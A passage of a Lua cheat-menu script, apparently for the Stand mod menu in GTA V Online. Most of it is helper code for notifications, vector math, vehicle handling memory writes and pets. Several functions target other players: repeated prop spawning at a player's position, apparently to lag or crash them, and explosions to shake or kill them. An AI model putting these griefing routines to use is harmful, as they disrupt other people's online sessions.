        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        entities.delete_by_handle(object)
        local object = entities.create_object(util.joaat("prop_windmill_01"), ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)))
        OBJECT.BREAK_OBJECT_FRAGMENT_CHILD(object, 1, true)
        wait(1000)
        entities.delete_by_handle(object)
    end)
end
--震动屏幕
function shake_player(pid, power)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'], 7, 0, false, true, power)
end
--恢复模型
function restore_model()
    if PED.IS_PED_MALE(PLAYER.PLAYER_PED_ID()) then
        menu.trigger_commands("mpmale")
        menu.trigger_commands("walkstyle normal")
    else
        menu.trigger_commands("mpfemale")
        menu.trigger_commands("walkstyle normal")
    end
end
--飘移
player_cur_car = 0

function get_vehicle_handling_value(veh, offset)
    local v_ptr = entities.handle_to_pointer(veh)
    local handling = memory.read_long(v_ptr + 0x918)
    return memory.read_float(handling + offset)
end

function set_vehicle_handling_value(veh, offset, value)
    local v_ptr = entities.handle_to_pointer(veh)
    local handling = memory.read_long(v_ptr + 0x918)
    memory.write_float(handling + offset, value)
end

last_vehicle_handling_data = {}
function set_vehicle_into_drift_mode(veh)
    local handling_values = {
        [0x0C] = 1900.0, -- fmass
        [0x20] = 0.0, -- vec com off x
        [0x24] = 0.0, -- vec com off y
        [0x28] = 0.0, -- vec com off z
        [0x30] = 1.0, -- vec inertia mult x
        [0x34] = 1.0, -- vec inertia mult y
        [0x38] = 1.0, -- vec inertia mult z
        [0x10] = 15.5, -- initial drag coeff
        [0x40] = 85.0, -- percent submerged
        [0x48] = 0.0,-- drive bias front
        [0x50] = 0.0,-- initial drive gears
        [0x60] = 1.9,-- initial drive force
        [0x54] = 1.0,-- fdrive interia
        [0x58] = 5.0,-- clutch change rate scale up
        [0x5C] = 5.0,-- clutch change rate scale down
        [0x68] = 200.0, -- initial drive max flat vel
        [0x6C] = 4.85, --  brake force
        [0x74] = 0.67, -- brake bias front
        [0x7C] = 3.5, -- handbrake force
        [0x80] = 1.2, -- steering lock
        [0x88] = 1.0, -- traction curve max
        [0x88] = 1.45, -- traction curve min
        [0x98] = 35.0, -- traction curve lateral
        [0xA0] = 0.15, -- traction curve spring delta max
        [0xA8] = 0.0, -- low speed traction loss mult
        [0xAC] = 0.0, -- camber stiffness
        [0xB0] = 0.45, -- traction bias front
        [0xB8] = 1.0, -- traction loss mult
        [0xBC] = 2.8, -- suspension force
        [0xC0] = 1.4, -- suspension comp damp
        [0xC4] = 2.2, -- suspension rebound damp
        [0xC8] = 0.06, -- suspension upper limit
        [0xCC] = -0.05, -- suspension lower limit
        [0xBC] = 2.8, -- suspension force
        [0xD0] = 0.0, -- suspension raise
        [0xD4] = 0.5, -- suspension bias front
        [0xD4] = 0.5, -- suspension bias front
    }
    for offset, value in pairs(handling_values) do 
        last_vehicle_handling_data[offset] = get_vehicle_handling_value(veh, offset)
        set_vehicle_handling_value(veh, offset, value)
    end
end
initial_d_mode = false
initial_d_score = false
function on_user_change_vehicle(vehicle)
    if vehicle ~= 0 then
        if initial_d_mode then 
            set_vehicle_into_drift_mode(vehicle)
        end

        local deez_nuts = {}
        local num_seats = VEHICLE.GET_VEHICLE_MODEL_NUMBER_OF_SEATS(ENTITY.GET_ENTITY_MODEL(vehicle))
        for i=1, num_seats do
            if num_seats >= 2 then
                deez_nuts[#deez_nuts + 1] = tostring(i - 2)
            else
                deez_nuts[#deez_nuts + 1] = tostring(i)
            end
        end


        if true then 
            native_invoker.begin_call()
            native_invoker.push_arg_int(vehicle)
            native_invoker.end_call("76D26A22750E849E")
        end

    end
end

--new
b_notifications = {}
b_notifications.new = function ()
    local self = {}

    local active_notifs = {}
    self.notif_padding = 0.005
    self.notif_text_size = 0.5
    self.notif_title_size = 0.6
    self.notif_spacing = 0.015
    self.notif_width = 0.15
    self.notif_flash_duration = 1
    self.notif_anim_speed = 1
    self.notif_banner_colour = {r = 1, g = 0, b = 1, a = 1}
    self.notif_flash_colour = {r = 0.5, g = 0.0, b = 0.5, a = 1}
    self.max_notifs = 10
    self.notif_banner_height = 0.002
    self.use_toast = false
    local split = function (input, sep)
        local t={}
        for str in string.gmatch(input, "([^"..sep.."]+)") do
                table.insert(t, str)
        end
        return t
    end
    
    local function lerp(a, b, t)
        return a + (b - a) * t
    end
    local cut_string_to_length = function(input, length, fontSize)
        input = split(input, " ")
        local output = {}
        local line = ""
        for i, word in ipairs(input) do
            if directx.get_text_size(line..word, fontSize) >= length then
                if directx.get_text_size(word, fontSize) > length then
                    while directx.get_text_size(word , fontSize) > length do
                        local word_lenght = string.len(word)
                        for x = 1, word_lenght, 1 do
                            if directx.get_text_size(line..string.sub(word ,1, x), fontSize) > length then
                                output[#output+1] = line..string.sub(word, 1, x - 1)
                                line = ""
                                word = string.sub(word, x, word_lenght)
                                break
                            end
                        end
                    end
                else
                    output[#output+1] =  line
                    line = ""
                end
            end
            if i == #input then
                output[#output+1] = line..word
            end
            line = line..word.." "
        end
        return table.concat(output, "\n")
    end

    local draw_notifs = function ()
        local aspect_16_9 = 1.777777777777778
        util.create_tick_handler(function ()
            local total_height = 0
            local delta_time = MISC.GET_FRAME_TIME()
            for i = #active_notifs, 1, -1 do
                local notif = active_notifs[i]
                local notif_body_colour = notif.colour
                if notif.flashtimer > 0 then
                    notif_body_colour = self.notif_flash_colour
                    notif.flashtimer = notif.flashtimer - delta_time
                end
                if notif.current_y_pos == -10 then
                    notif.current_y_pos = total_height
                end
                notif.current_y_pos = lerp(notif.current_y_pos, total_height, 5 * delta_time * self.notif_anim_speed)
                if not notif.marked_for_deletetion then
                    notif.animation_state = lerp(notif.animation_state, 1, 10 * delta_time * self.notif_anim_speed)
                end
                --#region
                    directx.draw_rect(
                        1 - self.notif_width - self.notif_padding * 2,
                        0.1 - self.notif_padding * 2 * aspect_16_9 + notif.current_y_pos,
                        self.notif_width + (self.notif_padding * 2),
                        (notif.text_height + notif.title_height + self.notif_padding * 2 * aspect_16_9) * notif.animation_state,
                        notif_body_colour
                    )
                    directx.draw_rect(
                        1 - self.notif_width - self.notif_padding * 2,
                        0.1 - self.notif_padding * 2 * aspect_16_9 + notif.current_y_pos,
                        self.notif_width + (self.notif_padding * 2),
                        self.notif_banner_height * aspect_16_9 * notif.animation_state,
                        self.notif_banner_colour
                    )
                    directx.draw_text(
                        1 - self.notif_padding - self.notif_width,
                        0.1 - self.notif_padding * aspect_16_9 + notif.current_y_pos,
                        notif.title,
                        ALIGN_TOP_LEFT,
                        self.notif_title_size,
                        {r = 1 * notif.animation_state, g = 1 * notif.animation_state, b = 1 * notif.animation_state, a = 1 * notif.animation_state}
                    )
                    directx.draw_text(
                        1 - self.notif_padding - self.notif_width,
                        0.1 - self.notif_padding * aspect_16_9 + notif.current_y_pos + notif.title_height,
                        notif.text,
                        ALIGN_TOP_LEFT,
                        self.notif_text_size,
                        {r = 1 * notif.animation_state, g = 1 * notif.animation_state, b = 1 * notif.animation_state, a = 1 * notif.animation_state}
                    )
    --#endregion
                total_height = total_height + ((notif.total_height + self.notif_padding * 2 + self.notif_spacing) * notif.animation_state)
                if notif.marked_for_deletetion then
                    notif.animation_state = lerp(notif.animation_state, 0, 10 * delta_time)
                    if notif.animation_state < 0.05 then
                        table.remove(active_notifs, i)
                    end
                elseif notif.duration < 0 then
                    notif.marked_for_deletetion = true
                end
                notif.duration = notif.duration - delta_time
            end
            return #active_notifs > 0
        end)
    end

    self.notify = function (title,text, duration, colour)
        if self.use_toast then
            util.toast(title.."\n"..text)
            return
        end
        title = cut_string_to_length(title, self.notif_width, self.notif_title_size)
        text = cut_string_to_length(text, self.notif_width, self.notif_text_size)
        local x, text_heigth = directx.get_text_size(text, self.notif_text_size)
        local xx, title_height = directx.get_text_size(title, self.notif_title_size)
        local hash = util.joaat(title..text)
        local new_notification = {
            title = title,
            flashtimer = self.notif_flash_duration,
            colour = colour or {r = 0.094, g = 0.098, b = 0.101, a = 1},
            duration = duration or 3,
            current_y_pos = -10,
            marked_for_deletetion = false,
            animation_state = 0,
            text = text,
            hash = hash,
            text_height = text_heigth,
            title_height = title_height,
            total_height = title_height + text_heigth
        }
        for i, notif in ipairs(active_notifs) do
            if notif.hash == hash then
                notif.flashtimer = self.notif_flash_duration * 0.5
                notif.marked_for_deletetion = false
                notif.duration = duration or 3
                return
            end
        end
        active_notifs[#active_notifs+1] = new_notification
        if #active_notifs > self.max_notifs then
            table.remove(active_notifs, 1)
        end
        if #active_notifs == 1 then draw_notifs() end
    end

    return self
end

function initial_d_score_thread()
    util.create_thread(function()
        local drift_score = 0
        local is_drifting = false
        while true do
            if not initial_d_mode or not initial_d_score then 
                util.stop_thread()
            end
            if player_cur_car ~= 0 and PED.IS_PED_IN_ANY_VEHICLE(players.user_ped(), true) then 
                if math.abs(ENTITY.GET_ENTITY_SPEED_VECTOR(player_cur_car, true).x) > 2 then 
                    is_drifting = true
                    drift_score = drift_score + 1
                    local c = ENTITY.GET_ENTITY_COORDS(player_cur_car)
                    c.z = c.z + 0.3
                    local score_pos = world_to_screen_coords(c.x, c.y, c.z)
                    directx.draw_text(score_pos.x, score_pos.y, "漂移分数: " .. tostring(drift_score), 5, 1, {r=1, g= 0.5, b = 0.4, a = 100}, true)
                else
                    if is_drifting then
                        is_drifting = false
                        notify("总漂移得分: " .. drift_score)
                    end
                    drift_score = 0
                end
            end
            wait()
        end
    end)
end
--相机方向推力
thrust_cam_dir_add = 1.25
before_vel = {x = 1, y = 1, z = 1}
function cam_direction()
local camRot = CAM.GET_FINAL_RENDERED_CAM_ROT(2)
-- credits to jinxscript
local inst = v3.new()
v3.set(inst,CAM.GET_FINAL_RENDERED_CAM_ROT(2))
local tmp = v3.toDir(inst)
v3.set(inst, v3.get(tmp))
v3.mul(inst, 10)
v3.set(tmp, CAM.GET_FINAL_RENDERED_CAM_COORD())
v3.add(inst, tmp)
local aim_pos = inst
local car_pos = ENTITY.GET_ENTITY_COORDS(player_cur_car)
local c = {}
c.x = before_vel.x+thrust_cam_dir_add + (aim_pos.x - car_pos.x)
c.y = before_vel.y+thrust_cam_dir_add + (aim_pos.y - car_pos.y)
ENTITY.SET_ENTITY_VELOCITY(player_cur_car, c.x, c.y, -0.002)
end
--获取导航点
function get_waypoint_pos(callback, silent)
        if HUD.IS_WAYPOINT_ACTIVE() then
            local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
            local waypoint_pos = HUD.GET_BLIP_COORDS(blip)
            if callback then
                callback(waypoint_pos)
            end
            return waypoint_pos
        elseif not silent then
            notification("没有设置导航点")
            return nil
        end
    end
--GPS
b_common_funcs = {}
b_common_funcs.new = function ()
    local self = {}
    --credit to Nowiry#2663 and QuickNET#9999 for this one
    self.address_from_pointer_chain = function (basePtr, offsets)
        local addr = memory.read_long(basePtr)
        for k = 1, (#offsets - 1) do
            addr = memory.read_long(addr + offsets[k])
            if addr == 0 then
                return 0
            end
        end
        addr = addr + offsets[#offsets]
        return addr
    end
    self.get_player_vehicle_class = function ()
        local veh = entities.get_user_vehicle_as_handle()
        return VEHICLE.GET_VEHICLE_CLASS(veh)
    end
    self.get_ascpect_ratio = function()
        local screen_x, screen_y = directx.get_client_size()
    
        return screen_x / screen_y
    end
    self.to_bits = function(num)
        -- returns a table of bits, least significant first.
        local t={} -- will contain the bits
        while num>0 do
            rest=math.fmod(num,2)
            t[#t+1]=rest
            num=(num-rest)/2
        end
        return t
    end
    self.split = function (input, sep)
        local t={}
        for str in string.gmatch(input, "([^"..sep.."]+)") do
                table.insert(t, str)
        end
        return t
    end
    local minimum = memory.alloc()
    local maximum = memory.alloc()
    self.get_pos_above_entity = function (entity)
        MISC.GET_MODEL_DIMENSIONS(ENTITY.GET_ENTITY_MODEL(entity), minimum, maximum)
        local maximum_vec = memory.read_vector3(maximum)
        return ENTITY.GET_OFFSET_FROM_ENTITY_IN_WORLD_COORDS(entity, 0, 0, maximum_vec.z)
    end
    self.copy_File = function(old_path, new_path)
        local old_file = io.open(old_path, "rb")
        local new_file = io.open(new_path, "wb")
        local old_file_sz, new_file_sz = 0, 0
        if not old_file or not new_file then
          return false
        end
        while true do
          local block = old_file:read(2^13)
          if not block then 
            old_file_sz = old_file:seek( "end" )
            break
          end
          new_file:write(block)
        end
        old_file:close()
        new_file_sz = new_file:seek( "end" )
        new_file:close()
        return new_file_sz == old_file_sz
      end
    return self
end
b_math_funcs = {}
b_math_funcs.new = function ()
    local self = {}
    self.lerp = function(a, b, t)
        return a + (b - a) * t
    end
    local EPSILON = 0.0000001
    self.RayIntersectsTriangle = function(rayOrigin, rayDirection, vertex1, vertex2, vertex3)
        local edge1, edge2, h, s, q, a, f, u, v
        edge1 = {x = vertex2.x - vertex1.x, y = vertex2.y - vertex1.y, z = vertex2.z - vertex1.z}
        edge2 = {x = vertex3.x - vertex1.x, y = vertex3.y - vertex1.y, z = vertex3.z - vertex1.z}
        h = {
            x =    edge2.y * rayDirection.z - edge2.z * rayDirection.y,
            y =    edge2.z * rayDirection.x - edge2.x * rayDirection.z,
            z =    edge2.x * rayDirection.y - edge2.y * rayDirection.x
        }
        a = h.x * edge1.x + h.y * edge1.y + h.z * edge1.z

        if a > -EPSILON and a < EPSILON then return false end

        f = 1.0/a
        s = {x = rayOrigin.x - vertex1.x, y = rayOrigin.y - vertex1.y, z = rayOrigin.z - vertex1.z}
        u = f * (h.x * s.x + h.y * s.y + h.z * s.z)
        if u < 0.0 or u > 1.0 then return false end
        q = {
            x =    edge1.y * s.z - edge1.z * s.y,
            y =    edge1.z * s.x - edge1.x * s.z,
            z =    edge1.x * s.y - edge1.y * s.x
        }
        v = f * (rayDirection.x * q.x + rayDirection.y * q.y + rayDirection.z * q.z)
        if v < 0.0 or u + v > 1.0 then return false end
        t = f *  (edge2.x * q.x + edge2.y * q.y + edge2.z * q.z)
        if t > EPSILON then
            return true, {
                x = rayOrigin.x + rayDirection.x * t,
                y = rayOrigin.y + rayDirection.y * t,
                z = rayOrigin.z + rayDirection.z * t
            }
        else
            return false
        end
    end
    return self
    
end
b_vectors = {}
b_vectors.new = function ()
    local self = {}

    self.vector2 = {}
    self.vector2.new = function (x, y)
        return {x = x, y = y}
    end
    self.vector2.dot = function(vector_a, vector_b)
        return (vector_a.x * vector_b.x) + (vector_a.y * vector_b.y)
    end
    self.vector2.magnitude = function(vector)
        return math.sqrt((vector.x * vector.x) + (vector.y * vector.y))
    end
    self.vector2.get_angle = function(vector_a, vector_b)
        return math.acos(self.vector2.dot(vector_a, vector_b) / self.vector2.magnitude(vector_a) / self.vector2.magnitude(vector_b))
    end
    self.vector3 = {}
    self.vector3.new = function (x, y, z)
        return {x = x, y = y, z = z}
    end
    self.vector3.add = function(a, b)
        return self.vector3.new(a.x + b.x, a.y + b.y, a.z + b.z)
    end
    self.vector3.sub = function(a, b)
        return self.vector3.new(a.x - b.x, a.y - b.y, a.z - b.z)
    end
    self.vector3.multiply = function (vec, num)
        return {x = vec.x * num, y = vec.y * num, z = vec.z * num}
    end
    return self
end
function get_waypoint_v3()
        if HUD.IS_WAYPOINT_ACTIVE() then
            local blip = HUD.GET_FIRST_BLIP_INFO_ID(8)
            local waypoint_pos = HUD.GET_BLIP_COORDS(blip)

            local success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
            local tries = 0
            while not success or tries <= 100 do
                success, Zcoord = util.get_ground_z(waypoint_pos.x, waypoint_pos.y)
                tries += 1
                wait()
            end
            if success then
                waypoint_pos.z = Zcoord
            end

            return waypoint_pos
        else
            notification("傻B,你都没标点")
        end
    end
--宠物
function getgroupsize(group)
    local unkPtr, sizePtr = memory.alloc(1), memory.alloc(1)
    PED.GET_GROUP_SIZE(group, unkPtr, sizePtr)
    return memory.read_int(sizePtr)
end

mygroup = PLAYER.GET_PLAYER_GROUP(players.user())

dogs = table.freeze({
    "Rottweiler",
    "Husky",
    "Poodle",
    "Pug",
    "Retriever",
    "Westy",
    "Shepherd",
    "Cat_01",
})

doganimations = {
    "WORLD_DOG_SITTING_ROTTWEILER",
    "WORLD_DOG_SITTING_RETRIEVER",
    "WORLD_DOG_SITTING_SHEPHERD",
    "WORLD_DOG_SITTING_SMALL",
}

activedogs = {}

function GenerateNametagOnPed(ped, nametag)
    util.create_thread(function()
        while ENTITY.DOES_ENTITY_EXIST(ped) do
            local headpos = PED.GET_PED_BONE_COORDS(ped, 0x796e, 0,0,0)
            GRAPHICS.SET_DRAW_ORIGIN(headpos.x, headpos.y, headpos.z+0.4, 0)

            HUD.SET_TEXT_COLOUR(200,200,200,220)
            HUD.SET_TEXT_SCALE(1, 0.5)
            HUD.SET_TEXT_CENTRE(true)
            HUD.SET_TEXT_FONT(4)
            HUD.SET_TEXT_OUTLINE()

            HUD.BEGIN_TEXT_COMMAND_DISPLAY_TEXT("STRING")
            HUD.ADD_TEXT_COMPONENT_SUBSTRING_PLAYER_NAME(nametag)
            HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0,0,0)
            GRAPHICS.CLEAR_DRAW_ORIGIN()
            wait()
        end
        HUD.END_TEXT_COMMAND_DISPLAY_TEXT(0,0,0)
        GRAPHICS.CLEAR_DRAW_ORIGIN()
    end)
end

function removeValues(t, removeT)
    for _, r in ipairs(removeT) do
        for i, v in ipairs(t) do
            if v == r then
                table.remove(t, i)
            end
        end
    end
end

function IsPlayerUsingOrbitalCannon(player)
    return BitTest(memory.read_int(memory.script_global((2657589 + (player * 466 + 1) + 427))), 0) -- Global_2657589[PLAYER::PLAYER_ID() /*466*/].f_427), 0
end

function pvpdefmode()
    for _, pid in ipairs(players.list(false, true, true)) do
        if PLAYER.IS_PLAYER_FREE_AIMING(pid) then
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, true)
        else 
            NETWORK.SET_REMOTE_PLAYER_AS_GHOST(pid, false)
        end
    end
end

    function get_hud_colour()
        local red_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Red")
        local green_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Green")
        local blue_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Blue")
        local alpha_colour_ref = menu.ref_by_path("Stand>Settings>Appearance>Colours>HUD Colour>Opacity")
        local red = menu.get_value(red_colour_ref)
        local green = menu.get_value(green_colour_ref)
        local blue = menu.get_value(blue_colour_ref)
        local alpha = menu.get_value(alpha_colour_ref)
        return red, green, blue, alpha
    end

function raycast_gameplay_cam_gun(flag, distance)
    local ptr1, ptr2, ptr3, ptr4 = memory.alloc(), memory.alloc(), memory.alloc(), memory.alloc()
    local cam_rot = CAM.GET_GAMEPLAY_CAM_ROT(0)
    local cam_pos = CAM.GET_GAMEPLAY_CAM_COORD()
    local direction = v3.toDir(cam_rot)
    local destination = 
    { 
        x = cam_pos.x + direction.x * distance, 
        y = cam_pos.y + direction.y * distance, 
        z = cam_pos.z + direction.z * distance 
    }
    SHAPETEST.GET_SHAPE_TEST_RESULT(
        SHAPETEST.START_EXPENSIVE_SYNCHRONOUS_SHAPE_TEST_LOS_PROBE(
            cam_pos.x, 
            cam_pos.y, 
            cam_pos.z, 
            destination.x, 
            destination.y, 
            destination.z, 
            flag, 
            players.user_ped(), 
            1
        ), ptr1, ptr2, ptr3, ptr4)
    local p1 = memory.read_int(ptr1)
    local p2 = memory.read_vector3(ptr2)
    local p3 = memory.read_vector3(ptr3)
    local p4 = memory.read_int(ptr4)
    return {p1, p2, p3, p4}
end
GTluaScript = menu
---
function kill_player(pid)
    local entity = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(pid)
    local coords = ENTITY.GET_ENTITY_COORDS(entity, true)
    FIRE.ADD_EXPLOSION(coords['x'], coords['y'], coords['z'] + 2, 7, 1000, false, true, 0)
    menu.trigger_commands("kill" .. players.get_name(pid))
end

protected_area_radius = 100
protected_areas = {}
protected_area_allow_friends = true
protected_areas_on = false
--背藏武器
function attachweapon(spawnweapon)
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 416676503) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 690389602) then
		ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.15, 0, 0.13, 270, 0, 0, false, true, false, false, 1, true)
	end
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -728555052) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -1609580060) then
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_bat")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.3, -0.18, -0.15, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_crowbar")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_battleaxe")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_golfclub")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hatchet")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_poolcue")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), -0.2, -0.18, 0.1, 0, 120, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stone_hatchet")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0.2, -0.18, -0.1, 0, 300, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_knuckle")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
		if not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_bat"))  and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_crowbar")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_battleaxe"))and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_golfclub")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hatchet")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_poolcue")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stone_hatchet")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_knuckle")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0, 0, 0.13, 0, 90, 270, false, true, false, false, 1, true)
		end
	end
	if (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1548507267) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -37788308) or (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1595662460) then	
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_petrolcan")) or (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hazardcan")) or (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fertilizercan")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x60F2), 0, -0.18, -0, 0, 90, 0, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_proxmine")) or (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stickybomb")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 0, 270, false, true, false, false, 1, true)
		end
		if (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fireextinguisher")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0, -0.05, 0.13, 0, 270, 90, false, true, false, false, 1, true)
		end
		if not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_petrolcan")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_hazardcan")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fertilizercan")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_proxmine")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_stickybomb")) and not (HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped()) == util.joaat("weapon_fireextinguisher")) then
			ENTITY.ATTACH_ENTITY_TO_ENTITY(spawnweapon, plyped(), PED.GET_PED_BONE_INDEX(plyped(), 0x192A), 0.2, 0, 0.13, 0, 270, 270, false, true, false, false, 1, true)
		end
	end

	if not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 416676503) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 690389602) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -728555052) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -1609580060) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1548507267) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == -37788308) and not (WEAPON.GET_WEAPONTYPE_GROUP(HUD._HUD_WEAPON_WHEEL_GET_SELECTED_HASH(plyped())) == 1595662460) then
